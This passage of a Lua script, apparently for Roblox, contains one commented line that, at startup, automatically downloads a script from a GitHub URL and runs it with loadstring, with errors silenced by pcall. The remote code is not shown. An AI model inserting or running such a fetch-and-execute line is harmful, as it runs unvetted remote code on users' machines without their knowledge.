...
-- Executa automaticamente o script adicional ao iniciar
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/gomesdev007/zyrohub/refs/heads/main/test12344_super_mini.lua"))()
end)
